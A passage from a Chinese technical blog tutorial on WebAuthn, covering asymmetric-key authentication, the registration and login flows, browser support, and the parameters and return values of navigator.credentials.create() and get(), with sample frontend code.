并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        challenge,\n        rp: {\n            id,\n            name\n        },\n        user: {\n            id,\n            name,\n            displayName\n        },\n        pubKeyCredParams: [\n            {\n                type: \"public-key\",\n                alg\n            }\n        ],\n        authenticatorSelection: {\n            authenticatorAttachment,\n            userVerification\n        },\n        excludeCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAttestationResponse {\n        attestationObject: ArrayBuffer(390) {},\n        clientDataJSON: ArrayBuffer(121) {}\n    },\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\n    type: \"public-key\"\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\n    publicKey: {\n        challenge,\n        rpId,\n        userVerification,\n        allowCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAssertionResponse {\n        authenticatorData: ArrayBuffer(37) {},\n        signature: ArrayBuffer(256) {},\n        userHandle: ArrayBuffer(64) {},\n        clientDataJSON: ArrayBuffer(118) {}\n    }\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\n    type: \"public-key\"\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\n    challenge, // 自行设置\n    rp, // 自行设置\n    user, // 自行设置\n    pubKeyCredParams: [\n        {\n            type: \"public-key\",\n            alg: -7 // ES256\n        },\n        {\n            type: \"public-key\",\n            alg: -257 // RS256\n        }\n    ],\n    authenticatorSelection: {\n        userVerification: \"discouraged\",\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\n    },\n    excludeCredentials, // 自行设置\n    timeout: 60000\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\n    return window.btoa(String.fromCharCode(...a));\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\n    const publicKeyCredential = {\n        id: credentialInfo.id,\n        type: credentialInfo.type,\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\n        response: {\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\n        }\n    };\n    return publicKeyCredential;\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\n    // 可以发送了\n}).catch((error) =&gt; {\n    console.warn(error); // 捕获错误\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        rp: {\n            icon\n        },\n        user: {\n            icon\n        },\n        attestation,\n        authenticatorSelection: {\n            requireResidentKey\n        },\n        extensions\n    }\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: 